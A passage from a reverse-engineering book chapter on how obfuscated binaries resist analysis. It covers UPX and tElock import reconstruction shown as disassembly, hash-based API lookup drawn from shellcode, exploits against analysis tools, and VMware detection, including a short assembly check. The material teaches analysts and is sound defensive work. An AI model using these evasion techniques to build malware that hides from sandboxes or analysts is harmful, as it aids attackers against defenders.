decompression stub.<a class="indexterm" id="IDX-CHP-21-0055"/></p><div class="figure"><a id="ida_navigation_band_for_a_binary_packed"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e35795"/><img alt="IDA navigation band for a binary packed using UPX" src="httpatomoreillycomsourcenostarchimages854318.png.jpg"/></div></div><p class="title">Figure 21-2. IDA navigation band for a binary packed using UPX</p></div><p>Examination of the contents of the address space would reveal empty space to the left of <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35802"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and apparently random data in the region between <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35808"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35814"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. The random data is the result of the UPX compression process, and the job of the decompression stub is to unpack that data into the empty region at the left of the navigation band before finally transferring control to the unpacked code. Note that the unusual appearance of the navigation band is a potential tip-off that this binary has been obfuscated in some manner. In fact, a number of things typically stand out when viewing an obfuscated binary with IDA. Some potential tip-offs that a binary is obfuscated include the following:<a class="indexterm" id="IDX-CHP-21-0056"/><a class="indexterm" id="IDX-CHP-21-0057"/></p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Very little code is highlighted in the navigation band.</p></li><li class="listitem"><p>Very few functions are listed in the Functions window. Often only the <code class="literal">start</code> function will appear.<a class="indexterm" id="IDX-CHP-21-0058"/></p></li><li class="listitem"><p>Very few imported functions are listed in the Imports window.<a class="indexterm" id="IDX-CHP-21-0059"/></p></li><li class="listitem"><p>Very few legible strings appear in the Strings window (not opened by default). Often only the names of the few imported libraries and functions will be visible.</p></li><li class="listitem"><p>One or more program sections will be both writable and executable.</p></li><li class="listitem"><p>Nonstandard section names such as <code class="literal">UPX0</code> or <code class="literal">.shrink</code> are used.</p></li></ul></div><div class="sidebar"><a id="sandbox_environments"/><p class="title">SANDBOX ENVIRONMENTS</p><p>The purpose of a <span class="emphasis"><em>sandbox environment</em></span> for reverse engineering is to allow you to execute a program in a manner that allows observation of the program’s behavior without allowing that behavior to adversely impact critical components of your reverse engineering platform. Sandbox environments are commonly constructed using platform virtualization software such asd VMware,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-16" id="CHP-21-FN-16">164</a>]</sup> but they may be constructed on dedicated systems that are capable of being restored to a known good state following the execution of any malware.<a class="indexterm" id="IDX-CHP-21-0060"/></p><p>A common feature of sandbox systems is the fact that they are typically heavily instrumented in order to observe and collect information on the behavior of programs run within the sandbox. Collected data may include information on the file system activity of a program, on the registry activity of a (Windows) program, and about any networking activity generated by the program.</p></div><p>The information presented in the navigation band can be correlated with the properties of each segment within the binary to determine whether the information presented in each display is consistent. The segments listing for this binary is shown here:<a class="indexterm" id="IDX-CHP-21-0061"/><a class="indexterm" id="IDX-CHP-21-0062"/><a class="indexterm" id="IDX-CHP-21-0063"/><a class="indexterm" id="IDX-CHP-21-0064"/><a class="indexterm" id="IDX-CHP-21-0065"/></p><a id="I_programlisting2_d1e35905"/><pre class="programlisting">Name   Start    End      R W X D L Align Base Type   Class
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> UPX0   00401000 00407000 R W X . L para  0001 public CODE
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> UPX1   00407000 00409000 R W X . L para  0002 public CODE
  UPX2   00409000 0040908C R W . . L para  0003 public DATA
  .idata 0040908C 004090C0 R W . . L para  0003 public XTRN
  UPX2   004090C0 0040A000 R W . . L para  0003 public DATA</pre><p>In this case, the entire range of addresses comprising segment <code class="literal">UPX0</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35924"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and segment <code class="literal">UPX1</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e35933"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> (<code class="literal">00401000-00409000</code>) is marked as executable (the <code class="literal">X</code> flag is set). Given this fact, we should expect to see the entire navigation band colorized to represent code. The fact that we do not, coupled with the fact that inspection reveals the entire range of <code class="literal">UPX0</code> to be empty, should be considered highly suspicious. Within IDA, the section header for <code class="literal">UPX0</code> contains the following lines:</p><a id="I_programlisting2_d1e35952"/><pre class="programlisting">UPX0:00401000 ;  Section 1. (virtual address 00001000)
UPX0:00401000 ;  Virtual size                  : 00006000 (  24576.)
UPX0:00401000 ;<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>Section size in file          : 00000000 (      0.)
UPX0:00401000 ;  Offset to raw data for section: 00000200
UPX0:00401000 ;<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>Flags E0000080: Bss Executable Readable Writable</pre><p>Techniques for using IDA to perform the decompression operation in a static context (without actually executing the binary) are discussed in <a class="xref" href="ch21s03.html" title="Static De-obfuscation of Binaries Using IDA">Static De-obfuscation of Binaries Using IDA</a> in <a class="xref" href="ch21s03.html" title="Static De-obfuscation of Binaries Using IDA">Static De-obfuscation of Binaries Using IDA</a>.</p></div></div><div class="sect2" title="Imported Function Obfuscation"><div class="titlepage"><div><div><h2 class="title"><a id="imported_function_obfuscation"/>Imported Function Obfuscation</h2></div></div></div><p>In order to avoid leaking information about potential actions that a binary may perform, an additional anti–static analysis technique is aimed at making it difficult to determine which shared libraries and library functions are used within an obfuscated binary. In most cases, it is possible to render tools such as <code class="literal">dumpbin</code>, <code class="literal">ldd</code>, and <code class="literal">objdump</code> ineffective for the purposes of listing library dependencies.</p><p>The effect of such obfuscations on IDA is most obvious in the Imports window. The entire content of the Imports window for our earlier tElock example is shown here:</p><a id="I_programlisting2_d1e35988"/><pre class="programlisting">Address   Ordinal   Name                  Library
0041EC2E            GetModuleHandleA      kernel32
0041EC36            MessageBoxA           user32</pre><p>Only two external functions are referenced, <code class="literal">GetModulehandleA</code> (from <span class="emphasis"><em>kernel32.dll</em></span>) and <code class="literal">MessageBoxA</code> (from <span class="emphasis"><em>user32.dll</em></span>). Virtually nothing about the behavior of the program can be inferred from this short list. How then does such a program get anything useful accomplished? Here again the techniques are varied, but they essentially boil down to the fact that the program itself must load any additional libraries that it depends on, and once the libraries are loaded, the program must locate any required functions within those libraries. In most cases, these tasks are performed by the de-obfuscation stub prior to transferring control to the de-obfuscated program. The end goal is for the program’s import table to have been properly initialized, just as if the process had been performed by the operating system’s own loader.<a class="indexterm" id="IDX-CHP-21-0066"/><a class="indexterm" id="IDX-CHP-21-0067"/></p><p>For Windows binaries, a simple approach is to use the <code class="literal">LoadLibrary</code> function to load required libraries by name and then perform function address lookups within each library using the <code class="literal">GetProcAddress</code> function. In order to use these functions, a program must be either explicitly linked to them or have an alternate means of looking them up. The Names listing for the tElock example does not include either of these functions, while the Names listing for the UPX example shown here includes both.</p><a id="I_programlisting2_d1e36018"/><pre class="programlisting">Address   Ordinal   Name                  Library
0040908C            LoadLibraryA          KERNEL32
00409090            GetProcAddress        KERNEL32
00409094            ExitProcess           KERNEL32
0040909C            RegCloseKey           ADVAPI32
004090A4            atoi                  CRTDLL
004090AC            ExitWindowsEx         USER32
004090B4            InternetOpenA         WININET
004090BC            recv                  wsock32</pre><p>The actual UPX code responsible for rebuilding the import table is shown in <a class="xref" href="ch21.html#import_table_reconstruction_in_upx" title="Example 21-1. Import table reconstruction in UPX">Example 21-1</a>.</p><div class="example"><a id="import_table_reconstruction_in_upx"/><p class="title">Example 21-1. Import table reconstruction in UPX</p><div class="example-contents"><pre class="programlisting">UPX1:0040886C loc_40886C:                       ; CODE XREF: start+12E↓j
  UPX1:0040886C        mov     eax, [edi]
  UPX1:0040886E        or      eax, eax
  UPX1:00408870        jz      short loc_4088AE
  UPX1:00408872        mov     ebx, [edi+4]
  UPX1:00408875        lea     eax, [eax+esi+8000h]
  UPX1:0040887C        add     ebx, esi
  UPX1:0040887E        push    eax
  UPX1:0040887F        add     edi, 8
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> UPX1:00408882        call    dword ptr [esi+808Ch] ; LoadLibraryA
  UPX1:00408888        xchg    eax, ebp
  UPX1:00408889
  UPX1:00408889 loc_408889:                       ; CODE XREF: start+146↓j
  UPX1:00408889        mov     al, [edi]
  UPX1:0040888B        inc     edi
  UPX1:0040888C        or      al, al
  UPX1:0040888E        jz      short loc_40886C
  UPX1:00408890        mov     ecx, edi
  UPX1:00408892        push    edi
  UPX1:00408893        dec     eax
  UPX1:00408894        repne scasb
  UPX1:00408896        push    ebp
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> UPX1:00408897        call    dword ptr [esi+8090h] ; GetProcAddress
    UPX1:0040889D        or      eax, eax
  UPX1:0040889F        jz      short loc_4088A8
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> UPX1:004088A1        mov     [ebx], eax            ; Save to import table
  UPX1:004088A3        add     ebx, 4
  UPX1:004088A6        jmp     short loc_408889</pre></div></div><p>This example contains an outer loop responsible for calling <code class="literal">LoadLibraryA</code><sup>[<a class="footnote" href="#ftn.CHP-21-FN-17" id="CHP-21-FN-17">165</a>]</sup> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36061"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and an inner loop responsible for calling <code class="literal">GetProcAddress</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36070"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. Following each successful call to <code class="literal">GetProcAddress</code>, the newly retrieved function address is stored into the reconstructed import table <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36080"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>.<a class="indexterm" id="IDX-CHP-21-0068"/></p><p>These loops are executed as the last portion of the UPX de-obfuscation stub, because each function takes string pointer parameters that point to either a library name or a function name, and the associated strings are held within the compressed data region to avoid detection by the <code class="literal">strings</code> utility. As a result, library loading in UPX cannot take place until the required strings have been decompressed.<a class="indexterm" id="IDX-CHP-21-0069"/></p><p>Returning to the tElock example, a different problem presents itself. With only two imported functions, neither of which is <code class="literal">LoadLibraryA</code> or <code class="literal">GetProcAddress</code>, how can the tElock utility perform the function-resolution tasks that were performed by UPX? All Windows processes depend on <span class="emphasis"><em>kernel32.dll</em></span>, which means that it is present in memory for all processes. If a program can locate <span class="emphasis"><em>kernel32.dll</em></span>, a relatively straightforward process may be followed to locate any function within the DLL, including <code class="literal">LoadLibraryA</code> and <code class="literal">GetProcAddress</code>. As shown previously, with these two functions in hand, it is possible to load any additional libraries required by the process and locate all required functions within those libraries. In his paper “Understanding Windows Shellcode,”<sup>[<a class="footnote" href="#ftn.CHP-21-FN-18" id="CHP-21-FN-18">166</a>]</sup> Skape discusses techniques for doing exactly this. While tElock does not use the exact techniques detailed by Skape, there are many parallels, and the net effect is to obscure the details of the loading and linking process. Without carefully tracing the program’s instructions, it is extremely easy to overlook the loading of a library or the lookup of a function address. The following small code fragment illustrates the manner in which tElock attempts to locate the address of <code class="literal">LoadLibraryA</code>:<a class="indexterm" id="IDX-CHP-21-0070"/></p><a id="I_programlisting2_d1e36133"/><pre class="programlisting">.shrink:0041D1E4                 cmp     dword ptr [eax], 64616F4Ch
.shrink:0041D1EA                 jnz     short loc_41D226
.shrink:0041D1EC                 cmp     dword ptr [eax+4], 7262694Ch
.shrink:0041D1F3                 jnz     short loc_41D226
.shrink:0041D1F5                 cmp     dword ptr [eax+8], 41797261h
.shrink:0041D1FC                 jnz     short loc_41D226</pre><p>It is immediately obvious that several comparisons are taking place in rapid succession. What may not be immediately clear is the purpose of these comparisons. Reformatting the operands used in each comparison sheds a little light on the code, as seen here:<a class="indexterm" id="IDX-CHP-21-0071"/><a class="indexterm" id="IDX-CHP-21-0072"/><a class="indexterm" id="IDX-CHP-21-0073"/><a class="indexterm" id="IDX-CHP-21-0074"/><a class="indexterm" id="IDX-CHP-21-0075"/><a class="indexterm" id="IDX-CHP-21-0076"/></p><a id="I_programlisting2_d1e36155"/><pre class="programlisting">.shrink:0041D1E4                 cmp     dword ptr [eax], 'daoL'
.shrink:0041D1EA                 jnz     short loc_41D226
.shrink:0041D1EC                 cmp     dword ptr [eax+4], 'rbiL'
.shrink:0041D1F3                 jnz     short loc_41D226
.shrink:0041D1F5                 cmp     dword ptr [eax+8], 'Ayra'
.shrink:0041D1FC                 jnz     short loc_41D226</pre><p>Each hexadecimal constant is actually a sequence of four ASCII characters, which taken in order (recall that the x86 is a little-endian processor and we need to read the characters in reverse order) spell <code class="literal">LoadLibraryA</code>. If the three comparisons succeed, then tElock has located the export table entry for <code class="literal">LoadLibraryA</code>, and in a few short operations, the address of this function will be obtained and available for use in loading additional libraries. An interesting characteristic of tElock’s approach to function lookup is that it is somewhat resistant to strings analysis because the 4-byte constants embedded directly in the program’s instructions do not look like more standard, null-terminated strings and thus do not get included in strings lists generated by IDA.<a class="indexterm" id="IDX-CHP-21-0077"/></p><p>Manually reconstructing a program’s import table through careful analysis of the program’s code is made easier in the case of UPX and tElock because, ultimately, they both contain ASCII character data that we can use to determine exactly which libraries and which functions are being referenced. Skape’s paper details a function-resolution process in which no strings at all appear within the code. The basic idea discussed in the paper is to precompute a unique hash<sup>[<a class="footnote" href="#ftn.CHP-21-FN-19" id="CHP-21-FN-19">167</a>]</sup> value for the name of each function that you need to resolve. To resolve each function, a search is conducted through a library’s exported names table. Each name in the table is hashed, and the resulting hash is compared against the precomputed hash value for the desired function. If the hashes match, the desired function has been located, and you can easily find its address in the library’s export address table. In order to statically analyze binaries obfuscated in this manner, you need to understand the hashing algorithm used for each function name and apply that algorithm to all of the names exported by the library that the program is searching. With a complete table of hashes in hand, you will be able to do a simple lookup of each hash that you encounter in the program to determine which function the hash references.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-20" id="CHP-21-FN-20">168</a>]</sup> A portion of such a table, generated for kernel32.dll, might look like this:<a class="indexterm" id="IDX-CHP-21-0078"/><a class="indexterm" id="IDX-CHP-21-0079"/><a class="indexterm" id="IDX-CHP-21-0080"/><a class="indexterm" id="IDX-CHP-21-0081"/></p><a id="I_programlisting2_d1e36201"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> GetProcAddress : 8A0FB5E2
  GetProcessAffinityMask : B9756EFE
  GetProcessHandleCount : B50EB87C
  GetProcessHeap : C246DA44
  GetProcessHeaps : A18AAB23
  GetProcessId : BE05ED07</pre><p>Note that the hash values are specific to the hash function being used within a particular binary and are likely to vary from one binary to another. Using this particular table, if the hash value <code class="literal">8A0FB5E2</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36213"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> was encountered within a program, we could quickly determine that the program was attempting to look up the address of the <code class="literal">GetProcAddress</code> function.</p><p>Skape’s use of hash values to resolve function names was originally developed and documented for use in exploit payloads for Windows vulnerabilities; however, hash values have been adopted for use in obfuscated programs as well. The WinLicense obfuscation utility is one example that makes use of such hashing techniques to disguise its behavior.<a class="indexterm" id="IDX-CHP-21-0082"/></p><p>A final note on import tables is that, interestingly, IDA is sometimes able to offer you a clue that something is not quite right with a program’s import table. Obfuscated Windows binaries often have sufficiently altered import tables that IDA will notify you that something seems out of the ordinary with such a binary. <a class="xref" href="ch21.html#mangled_imports_segment_warning_dialog" title="Figure 21-3. Mangled imports segment warning dialog">Figure 21-3</a> shows the warning dialog that IDA displays in such cases.</p><div class="figure"><a id="mangled_imports_segment_warning_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e36234"/><img alt="Mangled imports segment warning dialog" src="httpatomoreillycomsourcenostarchimages854321.png.jpg"/></div></div><p class="title">Figure 21-3. Mangled imports segment warning dialog</p></div><p>This dialog provides one of the earliest indications that a binary may have been obfuscated in some manner and should serve as a warning that the binary may be difficult to analyze. Thus, you should take care while analyzing the binary.</p></div><div class="sect2" title="Targeted Attacks on Analysis Tools"><div class="titlepage"><div><div><h2 class="title"><a id="targeted_attacks_on_analysis_tools"/>Targeted Attacks on Analysis Tools</h2></div></div></div><p>This category of anti–reverse engineering capability is mentioned only because of its unique potential to hinder reverse engineering efforts. Most reverse engineering tools can be viewed as highly specialized parsers that process input data to provide some sort of summary information or detail display. As software, these tools are not immune to the same types of vulnerabilities that affect all other software. Specifically, incorrect handling of user-supplied data may, in some cases, lead to exploitable conditions.<a class="indexterm" id="IDX-CHP-21-0083"/><a class="indexterm" id="IDX-CHP-21-0084"/><a class="indexterm" id="IDX-CHP-21-0085"/><a class="indexterm" id="IDX-CHP-21-0086"/><a class="indexterm" id="IDX-CHP-21-0087"/><a class="indexterm" id="IDX-CHP-21-0088"/><a class="indexterm" id="IDX-CHP-21-0089"/></p><p>In addition to the techniques we have discussed thus far, programmers intent on preventing analysis of their software may opt for a more active form of anti–reverse engineering. By properly crafting input files, it may be possible to create a program that is both valid enough to execute properly and mal-formed enough to exploit a vulnerability in a reverse engineering tool. Such vulnerabilities, while uncommon, have been documented to include vulnerabilities in IDA.<sup>[<a class="footnote" href="#ftn.CHP-21-FN-21" id="CHP-21-FN-21">169</a>]</sup> The goal of the attacker is to exploit the fact that a piece of malware is likely to get loaded into IDA at some point. At a minimum, the attacker may achieve a denial of service in which IDA always crashes before a database can be created; alternatively, the attacker may gain access to the analyst’s computer and associated network. Users concerned with this type of attack should consider performing all initial analysis tasks in a sandbox environment. For example, you might run a copy of IDA in a sandbox to create the initial database for all binaries. The initial database (which in theory is free from any malicious capability) can then be distributed to additional analysts, who need never touch the original binary file.</p></div></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-1" id="ftn.CHP-21-FN-1">149</a>] </sup>Shaun Clowes and Neel Mehta first introduced Shiva at CanSecWest in 2003. See <a class="ulink" href="http://www.cansecwest.com/core03/shiva.ppt">http://www.cansecwest.com/core03/shiva.ppt</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-2" id="ftn.CHP-21-FN-2">150</a>] </sup>The x86 <code class="literal">iret</code> instruction is used to return from an interrupt-handling routine. Interrupt-handling routines are most often found in kernel space.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-3" id="ftn.CHP-21-FN-3">151</a>] </sup>Think of a <span class="emphasis"><em>semaphore</em></span> as a token that must be in your possession before you can enter a room to perform some action. While you hold the token, no other person may enter the room. When you have finished with your task in the room, you may leave and give the token to someone else, who may then enter the room and take advantage of the work you have done (without your knowledge because you are no longer in the room!). Semaphores are often used to enforce mutual exclusion locks around code or data in a program.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-4" id="ftn.CHP-21-FN-4">152</a>] </sup>For more information on Windows Structured Exception Handling (SEH), see <a class="ulink" href="http://www.microsoft.com/msj/0197/exception/exception.aspx">http://www.microsoft.com/msj/0197/exception/exception.aspx</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-5" id="ftn.CHP-21-FN-5">153</a>] </sup>Windows configures the FS register to point to the base address of the current thread’s environment block (TEB). The first item (offset zero) in a TEB is the head of a linked list of pointers to exception handler functions, which are called in turn when an exception is raised in a process.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-6" id="ftn.CHP-21-FN-6">154</a>] </sup>In the x86, debug registers 0 through 7 (<code class="literal">Dr0</code> through <code class="literal">Dr7</code>) are used to control the use of hardware-assisted breakpoints. <code class="literal">Dr0</code> through <code class="literal">Dr3</code> are used to specify breakpoint addresses, while <code class="literal">Dr6</code> and <code class="literal">Dr7</code> are used to enable and disable specific hardware breakpoints.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-7" id="ftn.CHP-21-FN-7">155</a>] </sup>See <a class="ulink" href="http://upx.sourceforge.net/">http://upx.sourceforge.net/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-8" id="ftn.CHP-21-FN-8">156</a>] </sup>See <a class="ulink" href="http://www.aspack.com/">http://www.aspack.com/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-9" id="ftn.CHP-21-FN-9">157</a>] </sup>See <a class="ulink" href="http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/Telock.shtml">http://www.softpedia.com/get/Programming/Packers-Crypters-Protectors/Telock.shtml</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-10" id="ftn.CHP-21-FN-10">158</a>] </sup>See <a class="ulink" href="http://www.packetstormsecurity.org/groups/teso/indexdate.html">http://www.packetstormsecurity.org/groups/teso/indexdate.html</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-11" id="ftn.CHP-21-FN-11">159</a>] </sup>See <a class="ulink" href="http://www.cansecwest.com/core03/shiva.ppt">http://www.cansecwest.com/core03/shiva.ppt</a> (tool: <a class="ulink" href="http://www.securiteam.com/tools/5XP041FA0U.html">http://www.securiteam.com/tools/5XP041FA0U.html</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-12" id="ftn.CHP-21-FN-12">160</a>] </sup>See <a class="ulink" href="http://www.oreans.com/winlicense.php">http://www.oreans.com/winlicense.php</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-13" id="ftn.CHP-21-FN-13">161</a>] </sup>See <a class="ulink" href="http://www.vmpsoft.com/">http://www.vmpsoft.com/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-14" id="ftn.CHP-21-FN-14">162</a>] </sup>See <a class="ulink" href="http://www.symantec.com/connect/blogs/inside-jaws-trojanclampi">http://www.symantec.com/connect/blogs/inside-jaws-trojanclampi</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-15" id="ftn.CHP-21-FN-15">163</a>] </sup>See <a class="ulink" href="http://qunpack.ahteam.org/wp2/">http://qunpack.ahteam.org/wp2/</a> (Russian) or <a class="ulink" href="http://www.woodmann.com/collaborative/tools/index.php/Quick_Unpack">http://www.woodmann.com/collaborative/tools/index.php/Quick_Unpack</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-16" id="ftn.CHP-21-FN-16">164</a>] </sup>See <a class="ulink" href="http://www.vmware.com/">http://www.vmware.com/</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-17" id="ftn.CHP-21-FN-17">165</a>] </sup>Many Windows functions that accept string arguments come in two versions: one that accepts ASCII strings and one that accepts Unicode strings. The ASCII versions of these functions carry an <code class="literal">A</code> suffix, while the Unicode versions carry a <code class="literal">W</code> suffix.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-18" id="ftn.CHP-21-FN-18">166</a>] </sup>See <a class="ulink" href="http://www.hick.org/code/skape/papers/win32-shellcode.pdf">http://www.hick.org/code/skape/papers/win32-shellcode.pdf</a>, specifically <a class="xref" href="ch03.html" title="Chapter 3. IDA Pro Background">Chapter 3</a>, “Shellcode Basics,” and section 3.3, “Resolving Symbol Addresses.”</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-19" id="ftn.CHP-21-FN-19">167</a>] </sup>A <span class="emphasis"><em>hash function</em></span> is a mathematical process that derives a fixed-size result (4 bytes, for example) from an arbitrary-sized input (such as a string).</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-20" id="ftn.CHP-21-FN-20">168</a>] </sup>Hex-Rays discusses IDA’s debugging capabilities to compute such hashes here: <a class="ulink" href="http://www.hexblog.com/?p=93">http://www.hexblog.com/?p=93</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-21" id="ftn.CHP-21-FN-21">169</a>] </sup>See <a class="ulink" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0115">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0115</a>. More detail is available at <a class="ulink" href="http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=189">http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=189</a>.</p></div></div></div>
<div class="sect1" title="Anti&#x2013;Dynamic Analysis Techniques"><div class="titlepage"><div><div><h1 class="title"><a id="antindynamic_analysis_techniques"/>Anti–Dynamic Analysis Techniques</h1></div></div></div><p>None of the anti–static analysis techniques covered in the past few sections have any effect whatsoever on whether a program will actually execute or not. In fact, while they may make it difficult for you to comprehend the true behavior of a program using static analysis techniques alone, they can’t prevent the program from executing, or they would render a program useless from the start and therefore eliminate the need to analyze the program at all.</p><p>Given that a program must run in order for it to do any work, dynamic analysis aims to observe the behavior of a program in motion (while it is running) rather than observe the program at rest (using static analysis while the program is not running). In this section we briefly summarize some of the more common anti–dynamic analysis techniques. For the most part, these techniques have little effect on static analysis tools; however, where there is overlap, we will point this out. We will return to discuss the impact of many of these techniques on IDA’s integrated debugger beginning in <a class="xref" href="ch24.html" title="Chapter 24. The IDA Debugger">Chapter 24</a>.<a class="indexterm" id="IDX-CHP-21-0090"/></p><div class="sect2" title="Detecting Virtualization"><div class="titlepage"><div><div><h2 class="title"><a id="detecting_virtualization"/>Detecting Virtualization</h2></div></div></div><p>One of the most common choices for configuring a sandbox environment is to make use of virtualization software, such as VMware, to provide an execution environment for malicious software (or, for that matter, any other software of interest). The advantage of such environments is that they typically offer checkpoint and rollback capabilities that facilitate rapid restoration of the sandbox to a known clean state. The primary disadvantage of using such environments as the foundation for a sandbox is the fact that it is fairly easy (especially on 32-bit x86 platforms) for a program to detect that it is running within a virtualized environment. Under the assumption that virtualization equates to observation, many programs that want to remain undetected simply choose to shut down once they determine that they are running within a virtual machine.<a class="indexterm" id="IDX-CHP-21-0091"/><a class="indexterm" id="IDX-CHP-21-0092"/><a class="indexterm" id="IDX-CHP-21-0093"/></p><p>The following list describes a few of the techniques that have been used by programs running in virtualized environments to determine that they are running within a virtual machine rather than on native hardware.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Detection of virtualization–specific software</strong></span></span></dt><dd><p>Users often install helper applications within virtual machines to facilitate communications between a virtual machine and its host operating system or simply to improve performance within the virtual machine. The VMware Tools collection is one example of such software. The presence of such software is easily detected by programs running within the virtual machine. For example, when VMware Tools is installed into a Microsoft Windows virtual machine, it creates Windows registry entries that can be read by any program. VMware Tools is rarely required in order to run malware within a virtual environment and should not be installed so as to eliminate such trivially detectable traces of the virtual machine.<a class="indexterm" id="IDX-CHP-21-0094"/></p></dd><dt><span class="term"><span class="strong"><strong>Detection of virtualization–specific hardware</strong></span></span></dt><dd><p>Virtual machines make use of virtual hardware abstraction layers to provide the interface between the virtual machine and the host computer’s native hardware. Characteristics of the virtual hardware are often easily detectable by software running within the virtual machine. For example, VMware has been assigned its own organizationally unique identifiers (OUI)<sup>[<a class="footnote" href="#ftn.CHP-21-FN-22" id="CHP-21-FN-22">170</a>]</sup> for use with its virtualized network adapters. Observing a VMware-specific OUI is a good indication that a program is running within a virtual machine. Note that it is usually possible to modify the MAC address assigned to virtual network adapters using configuration options on the host computer.</p></dd><dt><span class="term"><span class="strong"><strong>Detection of virtual machine–specific behaviors</strong></span></span></dt><dd><p>Some virtualization platforms contain backdoor-style communications channels to facilitate communications between a virtual machine and its host software. For example, the following five lines may be used to determine if you are running within a VMware virtual machine:<sup>[<a class="footnote" href="#ftn.CHP-21-FN-23" id="CHP-21-FN-23">171</a>]</sup><a class="indexterm" id="IDX-CHP-21-0095"/></p><a id="I_programlisting2_d1e36372"/><pre class="programlisting">mov  eax, 0x564D5868    ; 'VMXh'
  mov  ecx, 10
  xor  ebx, ebx
  mov  dx,  0x5658        ; 'VX'
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> in   eax, dx</pre><p>The sequence will result in the EBX register containing the value <code class="literal">0x564D5868</code> if you are inside a virtual machine. If you are not within a virtual machine, the code will result in either an exception or no change to EBX, depending on the host operating system in use. This instruction sequence takes advantage of the fact that the x86 <code class="literal">in</code> instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e36388"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is generally not used or allowed in user-space programs; however, within VMware, the instruction sequence can be used to test for the presence of the channel used by VMware guest operating systems to communicate with their host operating system. This channel is used by VMware Tools, for example, to facilitate the exchange of data (such as clipboard contents) between the host and guest operating systems.<a class="indexterm" id="IDX-CHP-21-0096"/><a class="indexterm" id="IDX-CHP-21-0097"/><a class="indexterm" id="IDX-CHP-21-0098"/><a class="indexterm" id="IDX-CHP-21-0099"/><a class="indexterm" id="IDX-CHP-21-0100"/><a class="indexterm" id="IDX-CHP-21-0101"/><a class="indexterm" id="IDX-CHP-21-0102"/><a class="indexterm" id="IDX-CHP-21-0103"/><a class="indexterm" id="IDX-CHP-21-0104"/><a class="indexterm" id="IDX-CHP-21-0105"/></p></dd><dt><span class="term"><span class="strong"><strong>Detection of processor-specific behavioral changes</strong></span></span></dt><dd><p>Perfect virtualization is a difficult thing to achieve. Ideally a program should not be able to detect any difference between a virtualized environment and native hardware. However, this is seldom the case. Joanna Rutkowska developed her redpill<sup>[<a class="footnote" href="#ftn.CHP-21-FN-24" id="CHP-21-FN-24">172</a>]</sup> VMware-detection technique after observing behavioral differences between the operation of the x86 <code class="literal">sidt</code> instruction on native hardware and the same instruction executed within a virtual machine environment.</p></dd></dl></div><p>Though it is not the first paper on the topic, “On the Cutting Edge: Thwarting Virtual Machine Detection” by Tom Liston and Ed Skoudis<sup>[<a class="footnote" href="#ftn.CHP-21-FN-25" id="CHP-21-FN-25">173</a>]</sup> presents a nice overview of virtual machine–detection techniques.</p></div><div class="sect2" title="Detecting Instrumentation"><div 